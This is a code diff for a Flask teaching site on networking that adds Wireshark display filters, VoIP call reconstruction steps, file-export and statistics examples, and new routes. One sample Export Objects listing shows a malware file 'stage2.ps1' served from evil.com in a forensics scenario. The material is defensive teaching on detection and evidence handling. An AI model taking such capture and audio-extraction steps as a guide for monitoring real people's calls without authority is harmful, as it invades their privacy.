+            {"filter": "wlan.fc.type_subtype == 0x04", "desc": "Probe requests", "output": "Client probing for networks"},
+            {"filter": "wlan.fc.type_subtype == 0x0c", "desc": "Deauthentication", "output": "Deauth frames — attack detection"},
+            {"filter": "eapol", "desc": "EAPOL (WPA handshake)", "output": "4-way handshake frames"},
+            {"filter": "wlan.ssid == \"Corp-WiFi\"", "desc": "Specific SSID", "output": "Traffic for a specific network"}
+        ]
+    },
+    # ---------- Membership & Advanced ----------
+    {
+        "category": "Advanced Operators",
+        "color": "#c0392b",
+        "filters": [
+            {"filter": "tcp.port in {80, 443, 8080}", "desc": "Membership — multiple ports", "output": "Same as (port==80 || port==443 || port==8080)"},
+            {"filter": "ip.addr in {10.0.0.5 .. 10.0.0.9}", "desc": "IP range membership", "output": "Any IP in the range 10.0.0.5 to 10.0.0.9"},
+            {"filter": "http.request.method in {\"HEAD\", \"GET\"}", "desc": "Multiple HTTP methods", "output": "Requests with HEAD or GET"},
+            {"filter": "frame.time_delta > 1", "desc": "Packets with >1 second gap", "output": "Packets that arrive more than 1 second after previous"}
+        ]
+    },
+        # ---------- Column Filters (_ws.*) ----------
+    {
+        "category": "Column & Field Filters",
+        "color": "#00d4ff",
+        "filters": [
+            {"filter": "_ws.col.info contains \"error\"", "desc": "Packets with 'error' in Info column", "output": "Filters by what's shown in the Info column — matches any packet whose Info text contains 'error'"},
+            {"filter": "_ws.col.info contains \"HTTP\"", "desc": "Packets with 'HTTP' in Info column", "output": "Shows only packets that are HTTP-related based on Info text"},
+            {"filter": "_ws.col.protocol == \"HTTP\"", "desc": "Filter by Protocol column", "output": "Only packets dissected as HTTP"},
+            {"filter": "_ws.col.protocol == \"TCP\"", "desc": "Filter by Protocol = TCP", "output": "Only TCP packets"},
+            {"filter": "_ws.col.info == \"Standard query 0x1234 A google.com\"", "desc": "Exact match on Info column", "output": "Precise string match on Info text"},
+            {"filter": "_ws.col.info matches \"(?i)password\"", "desc": "Regex on Info column (case-insensitive)", "output": "Any packet whose Info text contains 'password' (any case)"},
+            {"filter": "_ws.col.info contains \"Retransmission\"", "desc": "Find TCP retransmissions", "output": "All packets the dissector marked as retransmissions"},
+            {"filter": "_ws.col.info contains \"Duplicate ACK\"", "desc": "Find duplicate ACKs", "output": "Duplicate ACK packets — sign of packet loss"},
+            {"filter": "_ws.col.info contains \"RST\"", "desc": "Connection resets", "output": "Packets with RST flag shown in Info column"},
+            {"filter": "_ws.col.info contains \"FIN\"", "desc": "Connection closes", "output": "Packets with FIN flag shown in Info column"},
+            {"filter": "_ws.col.info contains \"GET\"", "desc": "HTTP GET requests", "output": "Shortcut for HTTP GET — matches Info text"},
+            {"filter": "_ws.col.info contains \"POST\"", "desc": "HTTP POST requests", "output": "Shortcut for HTTP POST — matches Info text"},
+            {"filter": "_ws.col.info contains \"301\"", "desc": "HTTP 301 redirects", "output": "Any packet with '301' in Info (redirects)"},
+            {"filter": "_ws.col.info contains \"404\"", "desc": "HTTP 404 errors", "output": "Any packet with '404' in Info (not found)"},
+            {"filter": "_ws.col.info contains \"500\"", "desc": "HTTP 500 errors", "output": "Any packet with '500' in Info (server errors)"},
+            {"filter": "frame.number == 100", "desc": "Specific frame number", "output": "Only packet number 100 in the capture"},
+            {"filter": "frame.number >= 100 && frame.number <= 200", "desc": "Frame range", "output": "Packets 100 to 200 only"},
+            {"filter": "frame.len > 1000", "desc": "Large frames (>1000 bytes)", "output": "All packets larger than 1000 bytes — often file transfers"},
+            {"filter": "frame.time_delta > 1", "desc": "Frames >1s apart", "output": "Gaps in traffic — helpful for spotting pauses or hangs"},
+            {"filter": "frame.protocols contains \"http\"", "desc": "Frame protocol stack contains HTTP", "output": "Uses the internal frame.protocols field (e.g., 'eth:ip:tcp:http')"}
+        ]
+    },
+
+    # ---------- Field Existence ----------
+    {
+        "category": "Field Existence Filters",
+        "color": "#e91e63",
+        "filters": [
+            {"filter": "http", "desc": "Any packet containing HTTP", "output": "Same as: http or tcp.port==80 or tcp.port==8080"},
+            {"filter": "http.request", "desc": "HTTP requests only", "output": "Filter by existence of the http.request field"},
+            {"filter": "http.response", "desc": "HTTP responses only", "output": "Filter by existence of the http.response field"},
+            {"filter": "tls.handshake.extensions_server_name", "desc": "Packets with TLS SNI", "output": "Only Client Hello packets that advertise an SNI (hostname)"},
+            {"filter": "tcp.options", "desc": "TCP packets with options", "output": "Only TCP packets that carry TCP options (MSS, SACK, Timestamps)"},
+            {"filter": "!tcp.options", "desc": "TCP packets WITHOUT options", "output": "The `!` operator negates — packets with no TCP options"},
+            {"filter": "dns.qry.name", "desc": "Packets with DNS query name", "output": "Only DNS queries that contain a query name field"},
+            {"filter": "!arp", "desc": "Everything except ARP", "output": "Removes all ARP traffic from view"},
+            {"filter": "ip.addr && !ip.addr == 192.168.1.1", "desc": "IP traffic excluding one host", "output": "All IP traffic, minus anything to/from 192.168.1.1"}
+        ]
+    }
+]
+
+
+# ==================== WIRESHARK: VOIP ANALYSIS ====================
+WIRESHARK_VOIP = {
+    "intro": "VoIP analysis in Wireshark lets you capture SIP signaling and RTP media, reconstruct call flows, and even play back audio from captured calls.",
+    "sip_flow": [
+        {"step": 1, "from": "Client", "to": "Server", "method": "INVITE", "desc": "Client initiates call to server", "color": "#3498db"},
+        {"step": 2, "from": "Server", "to": "Client", "method": "100 Trying", "desc": "Server acknowledges INVITE", "color": "#f39c12"},
+        {"step": 3, "from": "Server", "to": "Client", "method": "180 Ringing", "desc": "Remote phone is ringing", "color": "#e67e22"},
+        {"step": 4, "from": "Server", "to": "Client", "method": "200 OK", "desc": "Remote answered — call accepted", "color": "#27ae60"},
+        {"step": 5, "from": "Client", "to": "Server", "method": "ACK", "desc": "Client confirms — call active", "color": "#9b59b6"},
+        {"step": 6, "from": "Both", "to": "Both", "method": "RTP Media", "desc": "Audio flows via RTP (both directions)", "color": "#16a085"},
+        {"step": 7, "from": "Client", "to": "Server", "method": "BYE", "desc": "Client hangs up", "color": "#e74c3c"},
+        {"step": 8, "from": "Server", "to": "Client", "method": "200 OK", "desc": "Server confirms teardown", "color": "#27ae60"}
+    ],
+    "rtp_playback_steps": [
+        {"step": 1, "title": "Open capture", "desc": "File → Open → select SIP+RTP pcap", "command": "wireshark callgen-traffic.pcap", "color": "#3498db"},
+        {"step": 2, "title": "Find VoIP calls", "desc": "Telephony → VoIP Calls", "command": "Shows list of calls with From, To, Duration", "color": "#f39c12"},
+        {"step": 3, "title": "Select a call", "desc": "Click on a call in the list", "command": "Highlight any call", "color": "#e67e22"},
+        {"step": 4, "title": "Open flow sequence", "desc": "Click 'Flow Sequence' button", "command": "Shows SIP ladder diagram with all messages", "color": "#9b59b6"},
+        {"step": 5, "title": "Find RTP streams", "desc": "Telephony → RTP → RTP Streams", "command": "Lists all RTP streams in capture", "color": "#16a085"},
+        {"step": 6, "title": "Select stream", "desc": "Click on stream matching your call", "command": "Shows SSRC, Payload, Packets, Lost, Jitter", "color": "#27ae60"},
+        {"step": 7, "title": "Play stream", "desc": "Click 'Analyze' → 'Play Streams'", "command": "RTP Player opens — click Play to hear audio", "color": "#e74c3c"},
+        {"step": 8, "title": "Save audio", "desc": "In RTP Player, click 'Save'", "command": "Saves as .au or .wav file", "color": "#34495e"}
+    ],
+    "voip_filters": [
+        {"filter": "sip", "desc": "All SIP messages", "use_case": "See call setup and teardown"},
+        {"filter": "rtp", "desc": "All RTP media", "use_case": "Analyze audio streams"},
+        {"filter": "sip.Method == \"INVITE\"", "desc": "Only INVITE messages", "use_case": "Count call attempts"},
+        {"filter": "sip.Method == \"BYE\"", "desc": "Only BYE messages", "use_case": "Count completed calls"},
+        {"filter": "rtp.ssrc == 0x...", "desc": "Specific RTP stream", "use_case": "Isolate one audio stream"}
+    ],
+    "scenario": {
+        "title": "Investigating a VoIP Call",
+        "story": "Your SOC receives a tip: an employee may be exfiltrating data via VoIP. You capture SIP+RTP traffic and need to reconstruct the call, listen to it, and check for anomalies.",
+        "steps": [
+            "Open the pcap in Wireshark",
+            "Telephony → VoIP Calls → see all calls",
+            "Click on suspicious call → Flow Sequence",
+            "Check From/To fields for anomalies",
+            "Telephony → RTP → RTP Streams",
+            "Analyze stream — check packet loss and jitter",
+            "Play Streams to hear the audio",
+            "If audio reveals data exfil, save as evidence"
+        ]
+    }
+}
+
+# ==================== WIRESHARK: EXPORT & FILES ====================
+WIRESHARK_EXPORT = {
+    "export_objects": {
+        "intro": "Wireshark can extract files that were transferred over the network — like malware, images, or documents — from a capture file.",
+        "protocols": [
+            {"protocol": "HTTP", "desc": "Extract files from HTTP responses", "example": "stage2.ps1, index.html, image.jpg"},
+            {"protocol": "SMB", "desc": "Extract files from Windows file shares", "example": "\\\\server\\share\\file.doc"},
+            {"protocol": "TFTP", "desc": "Extract files from TFTP transfers", "example": "config.bin, firmware.img"},
+            {"protocol": "IMF", "desc": "Extract email messages from IMF", "example": "email.eml"},
+            {"protocol": "DICOM", "desc": "Extract medical imaging files", "example": "scan.dcm"}
+        ],
+        "gui_steps": [
+            {"step": 1, "title": "Open capture", "desc": "File → Open → select your pcap", "color": "#3498db"},
+            {"step": 2, "title": "Go to Export Objects", "desc": "File → Export Objects → HTTP", "color": "#f39c12"},
+            {"step": 3, "title": "Select object", "desc": "List shows all extracted files with size and type", "color": "#e67e22"},
+            {"step": 4, "title": "Save file", "desc": "Select file → Save As → choose destination", "color": "#27ae60"},
+            {"step": 5, "title": "Verify hash", "desc": "shasum -a 256 extracted_file", "color": "#9b59b6"}
+        ],
+        "tshark_commands": [
+            {"cmd": "tshark -r capture.pcap --export-objects http,out/", "desc": "Extract all HTTP objects to out/ folder"},
+            {"cmd": "tshark -r capture.pcap --export-objects smb,out/", "desc": "Extract all SMB files"},
+            {"cmd": "tshark -r capture.pcap --export-objects http2,h2_objects/", "desc": "Extract HTTP/2 objects"},
+            {"cmd": "ls -la out/", "desc": "List extracted files"},
+            {"cmd": "file out/*", "desc": "Identify file types"}
+        ],
+        "scenario": {
+            "title": "Extracting Malware from PCAP",
+            "story": "A user's machine was infected. You capture traffic and need to extract the malware payload that was downloaded. You use Wireshark's Export Objects feature to carve out the malicious file.",
+            "steps": [
+                "Open the pcap in Wireshark",
+                "File → Export Objects → HTTP",
+                "Look for suspicious entries (e.g., .exe, .ps1, .dll)",
+                "Select stage2.ps1 (text/plain, 4198 bytes)",
+                "Save As → malware_sample.ps1",
+                "Run: shasum -a 256 malware_sample.ps1",
+                "Verify hash matches IOC database",
+                "Analyze in isolated VM (never execute)"
+            ],
+            "output": """File → Export Objects → HTTP shows:
+─────────────────────────────────
+Packet  Host           Content Type       Size    Filename
+─────────────────────────────────
+1234    192.168.1.5    text/html          5432    index.html
+1567    evil.com       application/octet-stream  4198    stage2.ps1
+1890    192.168.1.5    image/jpeg         24567   photo.jpg
+─────────────────────────────────
+Select stage2.ps1 → Save As → malware_sample.ps1"""
+        }
+    },
+    "save_formats": {
+        "intro": "Wireshark supports many file formats. Choose the right one for your needs.",
+        "formats": [
+            {"ext": "pcapng", "name": "PCAP Next Generation", "desc": "Default, flexible, supports multiple interfaces, comments", "recommended": True},
+            {"ext": "pcap", "name": "Libpcap", "desc": "Classic format, used by tcpdump, Snort, Nmap", "recommended": True},
+            {"ext": "cap", "name": "Microsoft Network Monitor", "desc": "NetMon format", "recommended": False},
+            {"ext": "snoop", "name": "Sun snoop", "desc": "Oracle/Sun Solaris format", "recommended": False},
+            {"ext": "erf", "name": "Endace ERF", "desc": "Endace Measurement Systems format", "recommended": False},
+            {"ext": "trc", "name": "HP-UX nettl", "desc": "HP-UX trace format", "recommended": False}
+        ],
+        "save_gui": [
+            {"step": 1, "title": "File → Save As", "desc": "Ctrl+Shift+S", "color": "#3498db"},
+            {"step": 2, "title": "Choose filename", "desc": "e.g., incident_2024_01_15.pcapng", "color": "#f39c12"},
+            {"step": 3, "title": "Select format", "desc": "pcapng (default) or pcap", "color": "#e67e22"},
+            {"step": 4, "title": "Compress with gzip", "desc": "Optional — saves disk space", "color": "#27ae60"},
+            {"step": 5, "title": "Click Save", "desc": "File written to disk", "color": "#9b59b6"}
+        ],
+        "export_specific": {
+            "title": "Export Only Some Packets",
+            "desc": "File → Export Specified Packets",
+            "options": [
+                "Packet Range: All / Displayed / Marked / Selected",
+                "Example: Apply filter 'http' first → Export Displayed only"
+            ]
+        },
+        "export_pdus": {
+            "title": "Export Protocol Data Units",
+            "desc": "File → Export PDUs to File",
+            "options": [
+                "Extract raw PDUs for specific protocol",
+                "Useful for handing off to other tools"
+            ]
+        }
+    },
+    "capture_properties": {
+        "intro": "Statistics → Capture File Properties shows everything about your capture file.",
+        "fields": [
+            {"name": "File Name", "example": "incident.pcapng", "desc": "Name of the capture file"},
+            {"name": "File Size", "example": "15.2 MB", "desc": "Total disk size"},
+            {"name": "SHA256", "example": "a3f5...", "desc": "Hash for evidence integrity — VERIFY THIS!"},
+            {"name": "Capture Duration", "example": "3600 seconds", "desc": "Total capture time"},
+            {"name": "Start Time", "example": "2024-01-15 14:00:00", "desc": "When capture started"},
+            {"name": "End Time", "example": "2024-01-15 15:00:00", "desc": "When capture ended"},
+            {"name": "Packets", "example": "125,432", "desc": "Total packet count"},
+            {"name": "Avg Packet Size", "example": "120 bytes", "desc": "Average size"},
+            {"name": "Interfaces", "example": "eth0, wlan0", "desc": "Captured interfaces"},
+            {"name": "Comments", "example": "Case #2024-1234", "desc": "Optional notes — add these!"}
+        ],
+        "scenario": {
+            "title": "Documenting Evidence",
+            "story": "You're collecting network evidence for a case. Before saving, you add documentation to the capture file so it's clear where it came from, who captured it, and when.",
+            "steps": [
+                "Statistics → Capture File Properties",
+                "Click the Comments field",
+                "Add: 'Captured by analyst1 on 2024-01-15 from 192.168.1.100'",
+                "Click Save Comments",
+                "File → Save As → incident_2024_01_15.pcapng",
+                "Document the SHA256 hash in your case notes"
+            ]
+        }
+    }
+}
+
+# ==================== WIRESHARK: STATISTICS ====================
+WIRESHARK_STATS = [
+    {
+        "name": "Capture File Properties",
+        "icon": "📄",
+        "color": "#3498db",
+        "desc": "Summary of the capture — file name, size, SHA256 hash, duration, packet count, interfaces, comments.",
+        "use_case": "Documenting evidence and verifying integrity",
+        "output": """File:         incident.pcapng
+Size:         15.2 MB
+SHA256:       a3f5c8b2d1e4f7a9...
+Duration:     3600 seconds
+Packets:      125,432
+Avg Size:     120 bytes
+Interfaces:   eth0
+Comments:     Case #2024-1234"""
+    },
+    {
+        "name": "Protocol Hierarchy",
+        "icon": "🌳",
+        "color": "#27ae60",
+        "desc": "Tree of all protocols present in the capture with packet/byte counts and percentages.",
+        "use_case": "Understanding what kind of traffic is in the capture at a glance",
+        "output": """Protocol                    % Packets  % Bytes
+─────────────────────────────────────────────
+Ethernet                    100.00     100.00
+  IPv4                       95.50      97.20
+    TCP                      80.20      85.40
+      HTTP                   45.10      60.20
+      TLS                    30.50      22.10
+      SSH                     4.60       3.10
+    UDP                      15.30      11.80
+      DNS                    10.20       2.50
+      DHCP                    5.10       9.30
+  ARP                         4.50       2.80"""
+    },
+    {
+        "name": "Conversations",
+        "icon": "💬",
+        "color": "#9b59b6",
+        "desc": "All conversations between endpoints — IP pairs, TCP/UDP streams, with packet/byte counts and duration.",
+        "use_case": "Finding top talkers and largest data transfers",
+        "output": """TCP Conversations:
+Address A            Port A  Address B            Port B  Packets  Bytes   Duration
+──────────────────────────────────────────────────────────────────────────────────
+192.168.1.100        54321   142.250.185.78       443     4,521    6.2 MB  45 min
+192.168.1.100        54322   203.0.113.5          22      3,245    1.8 MB  20 min
+192.168.1.50         50000   8.8.8.8              53      1,234    256 KB  5 min"""
+    },
+    {
+        "name": "Endpoints",
+        "icon": "🎯",
+        "color": "#f39c12",
+        "desc": "Summary of all endpoints (IPs, MACs, ports) — packets and bytes per endpoint.",
+        "use_case": "Identifying busiest hosts and anomalous endpoints",
+        "output": """IPv4 Endpoints:
+Address              Packets   Bytes     Tx Packets  Tx Bytes
+─────────────────────────────────────────────────────────────
+192.168.1.100        5,678     8.9 MB    3,200       5.1 MB
+192.168.1.50         3,456     4.2 MB    1,800       2.1 MB
+142.250.185.78       4,521     6.2 MB    2,300       3.4 MB
+203.0.113.5          3,245     1.8 MB    1,600       0.9 MB"""
+    },
+    {
+        "name": "I/O Graph",
+        "icon": "📈",
+        "color": "#e74c3c",
+        "desc": "Graph of traffic over time — packets/sec, bytes/sec, or custom filters.",
+        "use_case": "Spotting traffic spikes, attacks, and anomalies",
+        "output": """Graph shows:
+X-axis: time (0 to 3600 seconds)
+Y-axis: packets/sec
+[Graph displays spike at t=1200s — 5000 packets/sec]
+Interpretation: Massive spike → DDoS or scan attack"""
+    },
+    {
+        "name": "Expert Information",
+        "icon": "⚠️",
+        "color": "#c0392b",
+        "desc": "Warnings, errors, and notable events grouped by severity.",
+        "use_case": "Quick triage of what's wrong in the capture",
+        "output": """Expert Info:
+Severity    Group        Count   Description
+─────────────────────────────────────────────
+Error       Malformed    12      Malformed packet detected
+Warning     Checksum     45      Bad TCP checksum
+Warning     Sequence     234     TCP out-of-order
+Note        Response     89      No response seen
+Chat        TCP          1,234   Connection established"""
+    },
+    {
+        "name": "Flow Graph",
+        "icon": "📊",
+        "color": "#16a085",
+        "desc": "Visual diagram of packet flow between endpoints — great for VoIP and TCP analysis.",
+        "use_case": "Understanding complex flows and call sequences",
+        "output": """Flow Graph (VoIP Call):
+Client                          Server
+  │                                │
+  │──── INVITE ───────────────────>│
+  │<─── 100 Trying ────────────────│
+  │<─── 180 Ringing ───────────────│
+  │<─── 200 OK ────────────────────│
+  │──── ACK ──────────────────────>│
+  │<════ RTP Audio ═══════════════>│
+  │──── BYE ──────────────────────>│
+  │<─── 200 OK ────────────────────│
+  │                                │"""
+    }
+
+
+]
 # ==================== ROUTES ====================
 
 # ==================== ROUTES ====================
@@ -7054,16 +9264,50 @@ def layer_detail(layer_num):
     layer_devices = [DEVICES[k] for k in layer["device_keys"] if k in DEVICES]
     return render_template('layer.html', layer=layer, all_layers=OSI_LAYERS, devices=layer_devices)
 
-@app.route('/tcp')
-def tcp():
-    return render_template('tcp.html', flags=TCP_FLAGS, handshake=TCP_HANDSHAKE, termination=TCP_TERMINATION)
-
 @app.route('/ip-ports')
 def ip_ports():
     return render_template('ip_ports.html',
                          ip_addresses=IP_ADDRESSES,
                          port_categories=PORT_CATEGORIES,
                          simulation=IP_PORT_SIMULATION)
+@app.route('/tcp')
+def tcp():
+    return render_template('tcp.html',
+                         flags=TCP_FLAGS,
+                         handshake=TCP_HANDSHAKE,
+                         termination=TCP_TERMINATION,
+                         segment_fields=TCP_SEGMENT_FIELDS)
+
+@app.route('/udp')
+def udp():
+    return render_template('udp.html', segment_fields=UDP_SEGMENT_FIELDS)
+
+
+# ==================== WIRESHARK ROUTES ====================
+@app.route('/wireshark')
+def wireshark_hub():
+    return render_template('wireshark_hub.html')
+
+@app.route('/wireshark/interface')
+def wireshark_interface():
+    return render_template('wireshark_interface.html', menus=WIRESHARK_MENUS)
+
+@app.route('/wireshark/filters')
+def wireshark_filters():
+    return render_template('wireshark_filters.html', filters=WIRESHARK_FILTERS)
+
+@app.route('/wireshark/voip')
+def wireshark_voip():
+    return render_template('wireshark_voip.html', voip=WIRESHARK_VOIP)
+
+@app.route('/wireshark/export')
+def wireshark_export():
+    return render_template('wireshark_export.html', export=WIRESHARK_EXPORT)
+
+@app.route('/wireshark/statistics')
+def wireshark_statistics():
+    return render_template('wireshark_statistics.html', stats=WIRESHARK_STATS)
+
 
 
 @app.route('/subnetting')
@@ -7124,6 +9368,17 @@ def linux_processes():
     return render_template('linux_processes.html', processes=LINUX_PROCESSES)
 
 
+@app.route('/linux/logs')
+def linux_logs():
+    return render_template('linux_logs.html',
+                         log_files=LINUX_LOG_FILES,
+                         attack_simulations=LOG_ATTACK_SIMULATIONS)
+
+@app.route('/linux/firewall')
+def linux_firewall():
+    return render_template('linux_firewall.html', firewall=LINUX_FIREWALL)
+
+
 
 # ==================== WEB HACKING ROUTES ====================
 @app.route('/web')
@@ -7171,9 +9426,6 @@ def concept_detail(concept_id):
     if concept_id not in CONCEPTS:
         abort(404)
     return render_template('concept_detail.html', concept=CONCEPTS[concept_id], all_concepts=CONCEPTS)
-@app.route('/udp')
-def udp():
-    return render_template('udp.html')
 
 
 @app.route('/osi')
